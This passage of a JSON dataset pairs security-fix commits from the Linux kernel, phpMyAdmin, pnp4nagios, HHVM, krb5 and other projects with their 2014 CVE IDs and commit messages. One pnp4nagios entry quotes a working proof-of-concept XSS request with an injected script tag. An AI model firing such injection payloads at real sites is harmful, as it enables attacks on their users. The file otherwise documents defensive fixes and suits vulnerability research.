    "url": "https://github.com/torvalds/linux/commit/fd9f26e4eca5d08a27d12c0933fceef76ed9663d",
    "title": "ALSA: control: Don't access controls outside of protected regions",
    "body": "A control that is visible on the card->controls list can be freed at any time.This means we must not access any of its memory while not holding thecontrols_rw_lock. Otherwise we risk a use after free access.Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>Acked-by: Jaroslav Kysela <perex@perex.cz>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2014-4653"
    ],
    "cveIdsCount": 1
  },
  "23313253539925acc73a0e5181e2cf4125f66306b93298156547b0f322051244": {
    "url": "https://github.com/torvalds/linux/commit/82262a46627bebb0febcc26664746c25cef08563",
    "title": "ALSA: control: Fix replacing user controls",
    "body": "There are two issues with the current implementation for replacing usercontrols. The first is that the code does not check if the control is actually auser control and neither does it check if the control is owned by the processthat tries to remove it. That allows userspace applications to remove arbitrarycontrols, which can cause a user after free if a for example a driver does notexpect a control to be removed from under its feed.The second issue is that on one hand when a control is replaced theuser_ctl_count limit is not checked and on the other hand the user_ctl_count isincreased (even though the number of user controls does not change). This allowsuserspace, once the user_ctl_count limit as been reached, to repeatedly replacea control until user_ctl_count overflows. Once that happens new controls can beadded effectively bypassing the user_ctl_count limit.Both issues can be fixed by instead of open-coding the removal of the controlthat is to be replaced to use snd_ctl_remove_user_ctl(). This function doesproper permission checks as well as decrements user_ctl_count after the controlhas been removed.Note that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY atbeginning of the function if the control already exists is removed. This is nota problem though since the check is quite useless, because the lock that isprotecting the control list is released between the check and before adding thenew control to the list, which means that it is possible that a differentcontrol with the same settings is added to the list after the check. Luckilythere is another check that is done while holding the lock in snd_ctl_add(), sowe'll rely on that to make sure that the same control is not added twice.Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>Acked-by: Jaroslav Kysela <perex@perex.cz>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2014-4654",
      "CVE-2014-4655"
    ],
    "cveIdsCount": 2
  },
  "5649c348fbabda4007f4e8d3daabc6faa202e2ea4b85f901f7cdce8d0f97f590": {
    "url": "https://github.com/torvalds/linux/commit/883a1d49f0d77d30012f114b2e19fc141beb3e8e",
    "title": "ALSA: control: Make sure that id->index does not overflow",
    "body": "The ALSA control code expects that the range of assigned indices to a control iscontinuous and does not overflow. Currently there are no checks to enforce this.If a control with a overflowing index range is created that control becomeseffectively inaccessible and unremovable since snd_ctl_find_id() will not beable to find it. This patch adds a check that makes sure that controls with aoverflowing index range can not be created.Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>Acked-by: Jaroslav Kysela <perex@perex.cz>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2014-4656"
    ],
    "cveIdsCount": 1
  },
  "9afa91d7280753ab0f4c4a76bf9ce2869131decc1703a9a0b9653586f6fffb98": {
    "url": "https://github.com/torvalds/linux/commit/ac902c112d90a89e59916f751c2745f4dbdbb4bd",
    "title": "ALSA: control: Handle numid overflow",
    "body": "Each control gets automatically assigned its numids when the control is created.The allocation is done by incrementing the numid by the amount of allocatednumids per allocation. This means that excessive creation and destruction ofcontrols (e.g. via SNDRV_CTL_IOCTL_ELEM_ADD/REMOVE) can cause the id toeventually overflow. Currently when this happens for the control that caused theoverflow kctl->id.numid + kctl->count will also over flow causing it to besmaller than kctl->id.numid. Most of the code assumes that this is somethingthat can not happen, so we need to make sure that it won't happenSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>Acked-by: Jaroslav Kysela <perex@perex.cz>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2014-4656"
    ],
    "cveIdsCount": 1
  },
  "76e5490e029dc9687b368a876231b064d1283da5db5f90fcbaa5411cefc4c3e3": {
    "url": "https://github.com/kajona/kajonacms/commit/8f1b18150cc2a8f27c96d9c4f94a81022fbb61e3",
    "title": "BUG / SECURITY: module_system | class_link -> fixed some rare conditi…",
    "body": "…ons where a possible xss injection was possible for the systemid-param",
    "cveIds": [
      "CVE-2014-4742"
    ],
    "cveIdsCount": 1
  },
  "d092a86b9a1b1fb43693d758be90190476d215a3b449b0b24d946549dfe05d81": {
    "url": "https://github.com/kajona/kajonacms/commit/4a07f949c171da6aa9a6e6c19421b0df16297180",
    "title": "BUG / SECURITY: module_search | portal-js -> fixed a possible xss inj…",
    "body": "…ection, the search param is now included htmlencoded an no longer as plaintext",
    "cveIds": [
      "CVE-2014-4743"
    ],
    "cveIdsCount": 1
  },
  "ea1d7e5b5c136e2b7cbffd28c5f0acb74a7a0ca8ae0fcc6eba52c52aea75369a": {
    "url": "https://github.com/lingej/pnp4nagios/commit/cb925073edeeb97eb4ce61a86cdafccc9b87f9bb",
    "title": "Plug potential XSS hole in views/template.php",
    "body": "REQUEST_URI needs to be sanitized if used. Since we want to refreshto the same page there is no need to set the URI.Signed-off-by: Mikael Falkvidd <mfalkvidd@op5.com>",
    "cveIds": [
      "CVE-2014-4908"
    ],
    "cveIdsCount": 1
  },
  "49def42c0094ed6ad51df4c16339c5ff8f8c3ba6b45a9417614747f88ecf5802": {
    "url": "https://github.com/lingej/pnp4nagios/commit/e4a19768a5c5e5b1276caf3dd5bb721a540ec014",
    "title": "pnp/views/kohana_error_page: plug another XSS hole",
    "body": "By issuing the requestGET pnp/$item?996fb\"><script>alert(1)</script><\"951e1=1an alert is triggered in the meta refresh tag.The hole is plugged by not setting the URL of the meta refresh.The default behavior is to refresh the current page, which is whatwe want anyway.Change-Id: I6af0b15c929f95d651a576d46b99d2e1a88fe601Signed-off-by: Mikael Falkvidd <mfalkvidd@op5.com>",
    "cveIds": [
      "CVE-2014-4908"
    ],
    "cveIdsCount": 1
  },
  "a84bba0fdb81620fcc40b35fae8d311d8db40ca8ea285e35f731a5d9c8917d64": {
    "url": "https://github.com/torvalds/linux/commit/3cf521f7dc87c031617fd47e4b7aa2593c2f3daf",
    "title": "net/l2tp: don't fall back on UDP [get|set]sockopt",
    "body": "The l2tp [get|set]sockopt() code has fallen back to the UDP functionsfor socket option levels != SOL_PPPOL2TP since day one, but that hasnever actually worked, since the l2tp socket isn't an inet socket.As David Miller points out: \"If we wanted this to work, it'd have to look up the tunnel and then use tunnel->sk, but I wonder how useful that would be\"Since this can never have worked so nobody could possibly have dependedon that functionality, just remove the broken code and return -EINVAL.Reported-by: Sasha Levin <sasha.levin@oracle.com>Acked-by: James Chapman <jchapman@katalix.com>Acked-by: David Miller <davem@davemloft.net>Cc: Phil Turnbull <phil.turnbull@oracle.com>Cc: Vegard Nossum <vegard.nossum@oracle.com>Cc: Willy Tarreau <w@1wt.eu>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2014-4943"
    ],
    "cveIdsCount": 1
  },
  "5fa46682b92bc88ed9e8f5a70ee053a91afe47c009784c2d0386e4a2091f7a9f": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/57475371a5b515c83bfc1bb2efcdf3ddb14787ed",
    "title": "bug #4486 [security] XSS injection due to unescaped table comment",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-4954"
    ],
    "cveIdsCount": 1
  },
  "084af9e610cc8633fdcc77ce1845125196cfd8b74b4084e17dcfa2927cfbf14a": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/10014d4dc596b9e3a491bf04f3e708cf1887d5e1",
    "title": "bug #4488 [security] XSS injection due to unescaped table name (trigg…",
    "body": "…ers)Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-4955"
    ],
    "cveIdsCount": 1
  },
  "b6b18e3f770776dc78fbf074c889041ccd2fc038e959ff8c1b9ebcf076bc6879": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/29a1f56495a7d1d98da31a614f23c0819a606a4d",
    "title": "bug #4492 [security] XSS in AJAX confirmation messages",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-4986"
    ],
    "cveIdsCount": 1
  },
  "246755098e7bfc2a2cb222f10795e62f4a8c7d52187a2d571ed535dff87618f1": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/395265e9937beb21134626c01a21f44b28e712e5",
    "title": "bug #4491 [security] Missing validation for accessing User groups fea…",
    "body": "…tureSigned-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-4987"
    ],
    "cveIdsCount": 1
  },
  "e922bf4b2fd3f7f6ed8102718c0cf1411b00cdb9705176784d2c738c2b3236bf": {
    "url": "https://github.com/torvalds/linux/commit/1be9a950c646c9092fb3618197f7b6bfb50e82aa",
    "title": "net: sctp: inherit auth_capable on INIT collisions",
    "body": "Jason reported an oops caused by SCTP on his ARM machine withSCTP authentication enabled:Internal error: Oops: 17 [#1] ARMCPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1task: c6eefa40 ti: c6f52000 task.ti: c6f52000PC is at sctp_auth_calculate_hmac+0xc4/0x10cLR is at sg_init_table+0x20/0x38pc : [<c024bb80>] lr : [<c00f32dc>] psr: 40000013sp : c6f538e8 ip : 00000000 fp : c6f53924r10: c6f50d80 r9 : 00000000 r8 : 00010000r7 : 00000000 r6 : c7be4000 r5 : 00000000 r4 : c6f56254r3 : c00c8170 r2 : 00000001 r1 : 00000008 r0 : c6f1e660Flags: nZcv IRQs on FIQs on Mode SVC_32 ISA ARM Segment userControl: 0005397f Table: 06f28000 DAC: 00000015Process sctp-test (pid: 104, stack limit = 0xc6f521c0)Stack: (0xc6f538e8 to 0xc6f54000)[...]Backtrace:[<c024babc>] (sctp_auth_calculate_hmac+0x0/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c/0x5c8)[<c02497bc>] (sctp_packet_transmit+0x0/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc/0x844)[<c023e170>] (sctp_outq_flush+0x0/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24/0x28)[<c023ef54>] (sctp_outq_uncork+0x0/0x28) from [<c0234364>] (sctp_side_effects+0x1134/0x1220)[<c0233230>] (sctp_side_effects+0x0/0x1220) from [<c02330b0>] (sctp_do_sm+0xac/0xd4)[<c0233004>] (sctp_do_sm+0x0/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118/0x160)[<c0236644>] (sctp_assoc_bh_rcv+0x0/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c/0x74)[<c023d550>] (sctp_inq_push+0x0/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8/0x888)While we already had various kind of bugs in that areaec0223e (\"net: sctp: fix sctp_sf_do_5_1D_ce to verify ifwe/peer is AUTH capable\") and b14878c (\"net: sctp: cacheauth_enable per endpoint\"), this one is a bit of a differentkind.Giving a bit more background on why SCTP authentication isneeded can be found in RFC4895: SCTP uses 32-bit verification tags to protect itself against blind attackers. These values are not changed during the lifetime of an SCTP association. Looking at new SCTP extensions, there is the need to have a method of proving that an SCTP chunk(s) was really sent by the original peer that started the association and not by a malicious attacker.To cause this bug, we're triggering an INIT collision betweenpeers; normal SCTP handshake where both sides intent toauthenticate packets contains RANDOM; CHUNKS; HMAC-ALGOparameters that are being negotiated among peers: ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ----------> <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] --------- -------------------- COOKIE-ECHO --------------------> <-------------------- COOKIE-ACK ---------------------RFC4895 says that each endpoint therefore knows its own randomnumber and the peer's random number *after* the associationhas been established. The local and peer's random number alongwith the shared key are then part of the secret used forcalculating the HMAC in the AUTH chunk.Now, in our scenario, we have 2 threads with 1 non-blockingSEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEYand SCTP_AUTH_ACTIVE_KEY properly, and each of them callingsctp_bindx(3), listen(2) and connect(2) against each other,thus the handshake looks similar to this, e.g.: ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ----------> <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] --------- <--------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ----------- -------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] --------> ...Since such collisions can also happen with verification tags,the RFC4895 for AUTH rather vaguely says under section 6.1: In case of INIT collision, the rules governing the handling of this Random Number follow the same pattern as those for the Verification Tag, as explained in Section 5.2.4 of RFC 2960 [5]. Therefore, each endpoint knows its own Random Number and the peer's Random Number after the association has been established.In RFC2960, section 5.2.4, we're eventually hitting Action B: B) In this case, both sides may be attempting to start an association at about the same time but the peer endpoint started its INIT after responding to the local endpoint's INIT. Thus it may have picked a new Verification Tag not being aware of the previous Tag it had sent this endpoint. The endpoint should stay in or enter the ESTABLISHED state but it MUST update its peer's Verification Tag from the State Cookie, stop any init or cookie timers that may running and send a COOKIE ACK.In other words, the handling of the Random parameter is thesame as behavior for the Verification Tag as described inAction B of section 5.2.4.Looking at the code, we exactly hit the sctp_sf_do_dupcook_b()case which triggers an SCTP_CMD_UPDATE_ASSOC command to theside effect interpreter, and in fact it properly copies overpeer_{random, hmacs, chunks} parameters from the newly createdassociation to update the existing one.Also, the old asoc_shared_key is being released and based onthe new params, sctp_auth_asoc_init_active_key() updated.However, the issue observed in this case is that the previousasoc->peer.auth_capable was 0, and has *not* been updated, sothat instead of creating a new secret, we're doing an earlyreturn from the function sctp_auth_asoc_init_active_key()leaving asoc->asoc_shared_key as NULL. However, we now have toauthenticate chunks from the updated chunk list (e.g. COOKIE-ACK).That in fact causes the server side when responding with ... <------------------ AUTH; COOKIE-ACK -----------------... to trigger a NULL pointer dereference, since insctp_packet_transmit(), it discovers that an AUTH chunk isbeing queued for xmit, and thus it calls sctp_auth_calculate_hmac().Since the asoc->active_key_id is still inherited from theendpoint, and the same as encoded into the chunk, it usesasoc->asoc_shared_key, which is still NULL, as an asoc_keyand dereferences it in ... crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)... causing an oops. All this happens because sctp_make_cookie_ack()called with the *new* association has the peer.auth_capable=1and therefore marks the chunk with auth=1 after checkingsctp_auth_send_cid(), but it is *actually* sent later on overthe then *updated* association's transport that didn't initializeits shared key due to peer.auth_capable=0. Since control chunksin that case are not sent by the temporary association whichare scheduled for deletion, they are issued for xmit viaSCTP_CMD_REPLY in the interpreter with the context of the*updated* association. peer.auth_capable was 0 in the updatedassociation (which went from COOKIE_WAIT into ESTABLISHED state),since all previous processing that performed sctp_process_init()was being done on temporary associations, that we eventuallythrow away each time.The correct fix is to update to the new peer.auth_capablevalue as well in the collision case via sctp_assoc_update(),so that in case the collision migrated from 0 -> 1,sctp_auth_asoc_init_active_key() can properly recalculatethe secret. This therefore fixes the observed server panic.Fixes: 730fc3d (\"[SCTP]: Implete SCTP-AUTH parameter processing\")Reported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Tested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>Cc: Vlad Yasevich <vyasevich@gmail.com>Acked-by: Vlad Yasevich <vyasevich@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-5077"
    ],
    "cveIdsCount": 1
  },
  "ea2b6d1581d74478645fce97e53d026e492ee9f04b13d07985a5e17910eddebb": {
    "url": "https://github.com/torvalds/linux/commit/a6138db815df5ee542d848318e5dae681590fccd",
    "title": "mnt: Only change user settable mount flags in remount",
    "body": "Kenton Varda <kenton@sandstorm.io> discovered that by remounting aread-only bind mount read-only in a user namespace theMNT_LOCK_READONLY bit would be cleared, allowing an unprivileged userto the remount a read-only mount read-write.Correct this by replacing the mask of mount flags to preservewith a mask of mount flags that may be changed, and preserveall others. This ensures that any future bugs with this mask andremount will fail in an easy to detect way where new mount flagssimply won't change.Cc: stable@vger.kernel.orgAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2014-5206"
    ],
    "cveIdsCount": 1
  },
  "2427ff93ebabf62a27710fada4179637b89e9fa493e2e45263a93ffb31199d36": {
    "url": "https://github.com/torvalds/linux/commit/9566d6742852c527bf5af38af5cbb878dad75705",
    "title": "mnt: Correct permission checks in do_remount",
    "body": "While invesgiating the issue where in \"mount --bind -oremount,ro ...\"would result in later \"mount --bind -oremount,rw\" succeeding even ifthe mount started off locked I realized that there are severaladditional mount flags that should be locked and are not.In particular MNT_NOSUID, MNT_NODEV, MNT_NOEXEC, and the atimeflags in addition to MNT_READONLY should all be locked. Theseflags are all per superblock, can all be changed with MS_BIND,and should not be changable if set by a more privileged user.The following additions to the current logic are added in this patch.- nosuid may not be clearable by a less privileged user.- nodev may not be clearable by a less privielged user.- noexec may not be clearable by a less privileged user.- atime flags may not be changeable by a less privileged user.The logic with atime is that always setting atime on access is aglobal policy and backup software and auditing software could break ifatime bits are not updated (when they are configured to be updated),and serious performance degradation could result (DOS attack) if atimeupdates happen when they have been explicitly disabled. Therefore anunprivileged user should not be able to mess with the atime bits setby a more privileged user.The additional restrictions are implemented with the addition ofMNT_LOCK_NOSUID, MNT_LOCK_NODEV, MNT_LOCK_NOEXEC, and MNT_LOCK_ATIMEmnt flags.Taken together these changes and the fixes for MNT_LOCK_READONLYshould make it safe for an unprivileged user to create a usernamespace and to call \"mount --bind -o remount,... ...\" withoutthe danger of mount flags being changed maliciously.Cc: stable@vger.kernel.orgAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>",
    "cveIds": [
      "CVE-2014-5207"
    ],
    "cveIdsCount": 1
  },
  "a80f0d54c9d42c103113d4fad172bd2761d5cc180d8e61875a7a62305b41e647": {
    "url": "https://github.com/joyent/node/commit/530af9cb8e700e7596b3ec812bad123c9fa06356",
    "title": "v8: Interrupts must not mask stack overflow.",
    "body": "Backport of https://codereview.chromium.org/339883002",
    "cveIds": [
      "CVE-2014-5256"
    ],
    "cveIdsCount": 1
  },
  "f0914071df4bf50b72fcbaefa6aa12eb786618b70f2c03f70f8c46e87ee95c56": {
    "url": "https://github.com/avar/Plack/commit/bc1731dbb53850c380875ad683cd87c8ec99eee3",
    "title": "Plack::App::File: Fix a security issue by not pruning trailing slashes",
    "body": "Before this Plack::App::File would prune trailing slashes via its splitinvocation. I.e. it would think this: $ perl -MData::Dumper -wle 'print Dumper [split /[\\\\\\/]/, shift]' a/file.txt $VAR1 = [ 'a', 'file.txt' ];Was the same as: $ perl -MData::Dumper -wle 'print Dumper [split /[\\\\\\/]/, shift]' a/file.txt/// $VAR1 = [ 'a', 'file.txt' ];This can. turn into a nasty code exposure issue if you e.g. have an appthat basically does this: 1. I'd do a regex /.txt.pl\\z/ on a file to see if it was a text file 2. If so, do magic to generate text file via perl 3. Else it's not a /.txt.pl\\z/ file, so it must be some other static file with a different extension 4. Serve it up with Plack::Middleware::StaticThis is also not how other webservers or Unix utilities work: $ touch /tmp/foo.txt $ file /tmp/foo.txt /tmp/foo.txt: empty $ file /tmp/foo.txt/ /tmp/foo.txt/: ERROR: cannot open `/tmp/foo.txt/' (Not a directory)This resolves issue plack#405 that I filed around 9 months ago. I waspreviously working around it in my own code by doing: { # Let's see if someone's trying to be evil by # requesting e.g. /index.html/ instead of # /index.html. We don't want to fall through # and just serve up the raw content. my $plack_app_file = Plack::App::File->new({ root => PLACK_WEBSERVER_DOCUMENT_ROOT() }); my ($file) = $plack_app_file->locate_file($env); if ( # We'll get a reference if it's a full # Plack response. I.e. a 404 or whatever. ref $file ne 'ARRAY' and # WTF once we canonicalize the file and it # looks like a Mason handled path let's # not accept it, because we don't want to # serve up the raw unprocessed Mason page # via this hack. $file =~ $mason_handles_this_path_rx ) { TELL \"Middleware::Static: Path <$path> request, doesn't match <$mason_handles_this_path_rx>, but actually resolves to it via resolved file <$file>\" if DEBUG; # Tells our app to just serve up a # 400. Apache would do a 404 but I think # these requests are bad, so say so. $env->{$magic_marker_to_return_400} = 1; return; } }",
    "cveIds": [
      "CVE-2014-5269"
    ],
    "cveIdsCount": 1
  },
  "3fd1831656e11ef8bd8b75911197d103d7aaa25d526b72c51ebce5ad3acfc8ee": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/647c9d12e33a6b64e1c3ff7487f72696bdf2dccb",
    "title": "bug #4501 [security] XSS in table browse page",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5273"
    ],
    "cveIdsCount": 1
  },
  "2f5b004afc66373307ccd1ba15e5bfcd7d8aa62ca66c2b4a78b596d537f3184c": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/90ddeecf60fc029608b972e490b735f3a65ed0cb",
    "title": "bug #4504 [security] Self-XSS in query charts",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5273"
    ],
    "cveIdsCount": 1
  },
  "7820cc58a4d58b6d9079bfa6a68e30c45de004bb7bf5811483383aa62cc4382f": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/3ffc967fb60cf2910cc2f571017e977558c67821",
    "title": "bug #4517 [security] XSS in relation view",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5273"
    ],
    "cveIdsCount": 1
  },
  "97f628498d66301fd193cfb0a85fbbb3794ee3b3f00f39bc4b5a4c1a9631ad6d": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/cd9f302bf7f91a160fe7080f9a612019ef847f1c",
    "title": "bug #4503 [security] Self-XSSes in monitor",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5273"
    ],
    "cveIdsCount": 1
  },
  "bd004311c818e17ab283086f272bb147d53a904ba53d0389132ef71d3d715bdc": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/2c45d7caa614afd71dbe3d0f7270f51ce5569614",
    "title": "bug #4502 [security] Self-XSS in enum value editor",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5273"
    ],
    "cveIdsCount": 1
  },
  "fb40cde2010f72a51a905bf33fa02e18e06ec0f030bb8537f1742b26bbd51366": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/0cd293f5e13aa245e4a57b8d373597cc0e421b6f",
    "title": "bug #4505 [security] XSS in view operations page",
    "body": "Signed-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-5274"
    ],
    "cveIdsCount": 1
  },
  "c2135a6749e11cbc2c5312ca512211aeb611863565e2959f2d70751e6757c218": {
    "url": "https://github.com/monkey/monkey/commit/b2d0e6f92310bb14a15aa2f8e96e1fb5379776dd",
    "title": "Request: new request session flag to mark those files opened by FDT",
    "body": "This patch aims to fix a potential DDoS problem that can be causedin the server quering repetitive non-existent resources.When serving a static file, the core use Vhost FDT mechanism, but ifit sends a static error page it does a direct open(2). When closingthe resources for the same request it was just calling mk_vhost_close()which did not clear properly the file descriptor.This patch adds a new field on the struct session_request called 'fd_is_fdt',which contains MK_TRUE or MK_FALSE depending of how fd_file was opened.Thanks to Matthew Daley <mattd@bugfuzz.com> for report and troubleshoot thisproblem.Signed-off-by: Eduardo Silva <eduardo@monkey.io>",
    "cveIds": [
      "CVE-2014-5336"
    ],
    "cveIdsCount": 1
  },
  "c445636e1f0eaf1f6ed7fb3e961b676f433564b3f6cc2587ecc3960a315834cc": {
    "url": "https://github.com/krb5/krb5/commit/d1f707024f1d0af6e54a18885322d70fa15ec4d3",
    "title": "Fix LDAP misused policy name crash [CVE-2014-5353]",
    "body": "In krb5_ldap_get_password_policy_from_dn, if LDAP_SEARCH returnssuccessfully with no results, return KRB5_KDB_NOENTRY instead ofreturning success with a zeroed-out policy object. This fixes a nulldereference when an admin attempts to use an LDAP ticket policy nameas a password policy name.CVE-2014-5353:In MIT krb5, when kadmind is configured to use LDAP for the KDCdatabase, an authenticated remote attacker can cause a NULL dereferenceby attempting to use a named ticket policy object as a password policyfor a principal. The attacker needs to be authenticated as a user whohas the elevated privilege for setting password policy by adding ormodifying principals.Queries to LDAP scoped to the krbPwdPolicy object class will correctlynot return entries of other classes, such as ticket policy objects, butmay return success with no returned elements if an object with therequested DN exists in a different object class. In this case, theroutine to retrieve a password policy returned success with a passwordpolicy object that consisted entirely of zeroed memory. In particular,accesses to the policy name will dereference a NULL pointer. KDCoperation does not access the policy name field, but most kadminoperations involving the principal with incorrect password policywill trigger the crash.Thanks to Patrik Kis for reporting this problem.CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C[kaduk@mit.edu: CVE description and CVSS score]ticket: 8051 (new)target_version: 1.13.1tags: pullup",
    "cveIds": [
      "CVE-2014-5353"
    ],
    "cveIdsCount": 1
  },
  "b4cc89204841d6d8887630650fc80237e6f374a9c5ffb30725a51f69ee3a4b7b": {
    "url": "https://github.com/facebook/hhvm/commit/ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e",
    "title": "Fix mcrypt_create_iv(..., MCRYPT_RAND) to auto-seed RNG",
    "body": "Summary: Without seeding the random number generator,we'll always get the same IV, and that reduces the securityof this function.Fortunately, f_rand() has all of that logic for auto-seedingand selection of a suitable initial seed built-in.Realistically, using MCRYPT_RAND should be deprecated.I'm going to wait on PHP Internals to make a decision onhttps://wiki.php.net/rfc/deprecate_mcrypt_randbefore adding that warning however, so that our test suiteremains consistent.Credit: Theodore R. Smith of PHP Experts, Inc. <theodorephpexperts.pro>Closes #3496Reviewed By: @ptarjanDifferential Revision: D1502435",
    "cveIds": [
      "CVE-2014-5386"
    ],
    "cveIdsCount": 1
  },
  "9ba51193b3edeec1d5fc8759e0a4f700dfac9d3491e9ea7a93675f23811b56a7": {
    "url": "https://github.com/modxcms/revolution/commit/e36f80f18e9514204bf2ce82747c8adf7e47a9c9",
    "title": "Prevent XSS via $_GET param for controller action",
    "body": "Originally fixed in 2.2.x via 77463eb - was reverted somehowShould address #11966",
    "cveIds": [
      "CVE-2014-5451"
    ],
    "cveIdsCount": 1
  },
  "e972d0b0c890c7f71ec517d914c76a77b55db86f88d4d190717fdc5cf998061c": {
    "url": "https://github.com/torvalds/linux/commit/410dd3cf4c9b36f27ed4542ee18b1af5e68645a4",
    "title": "isofs: Fix unbounded recursion when processing relocated directories",
    "body": "We did not check relocated directory in any way when processing RockRidge 'CL' tag. Thus a corrupted isofs image can possibly have a CLentry pointing to another CL entry leading to possibly unboundedrecursion in kernel code and thus stack overflow or deadlocks (if thereis a loop created from CL entries).Fix the problem by not allowing CL entry to point to a directory entrywith CL entry (such use makes no good sense anyway) and by checkingwhether CL entry doesn't point to itself.CC: stable@vger.kernel.orgReported-by: Chris Evans <cevans@google.com>Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2014-5471",
      "CVE-2014-5472"
    ],
    "cveIdsCount": 2
  },
  "5d83b5d09abb449d9c962d0cb80b9a96e93bc3e9adc776215060fbfabfb2efdb": {
    "url": "https://github.com/facebook/hhvm/commit/1f91e076a585118495b976a413c1df40f6fd3d41",
    "title": "Fix integer overflow in chunk_split",
    "body": "Reviewed By: @ptarjanDifferential Revision: D1515947",
    "cveIds": [
      "CVE-2014-6228"
    ],
    "cveIdsCount": 1
  },
  "e10f1877eae05e9618a801096ff279adb2c3eceafc9dc77f7a93d3cb05bcbfc2": {
    "url": "https://github.com/facebook/hhvm/commit/7135ec229882370a00411aa50030eada6034cc1b",
    "title": "Fix potential security leak in HashContext",
    "body": "Summary: CVE-2014-6229This is not a NUL-terminated string, it's a fixed-size block of data.The risks were key truncation (if there happens to be a NUL byte in thekey) or over-reading (which would be information leakage).Reviewed By: @ptarjanDifferential Revision: D1533546",
    "cveIds": [
      "CVE-2014-6229"
    ],
    "cveIdsCount": 1
  },
  "9b2e1cd415e4b8f0bcdbb34081347539f3279971e51abadcb54d69db4fb765f9": {
    "url": "https://github.com/osclass/Osclass/commit/c163bf5910d0d36424d7fc678da6b03a0e443435",
    "title": "Merge pull request #1699 from conejoninja/fixescve",
    "body": "some fixes",
    "cveIds": [
      "CVE-2014-6280",
      "CVE-2014-6308"
    ],
    "cveIdsCount": 2
  },
  "a2882719bad24d81f153a8130a0d657292b7c188f10c77e212c309be8474c346": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/33b39f9f1dd9a4d27856530e5ac004e23b30e8ac",
    "title": "bug #4530 [security] DOM based XSS that results to a CSRF that create…",
    "body": "…s a ROOT account in certain conditionsSigned-off-by: Marc Delisle <marc@infomarc.info>",
    "cveIds": [
      "CVE-2014-6300"
    ],
    "cveIdsCount": 1
  },
  "47f7bdb7ac73e004a4854af0d2f2de281a1658a4fcba244de379fdcaee24806e": {
    "url": "https://github.com/visionmedia/send/commit/9c6ca9b2c0b880afd3ff91ce0d211213c5fa5f9a",
    "title": "Fix a path traversal issue when using root",
    "body": "fixes #59fixes #60",
    "cveIds": [
      "CVE-2014-6394"
    ],
    "cveIdsCount": 1
  },
  "6fad8af02402b6afb86836a6690d12cacfe448a7c2be8217c788de69e856110f": {
    "url": "https://github.com/torvalds/linux/commit/c03aa9f6e1f938618e6db2e23afef0574efeeb65",
    "title": "udf: Avoid infinite loop when processing indirect ICBs",
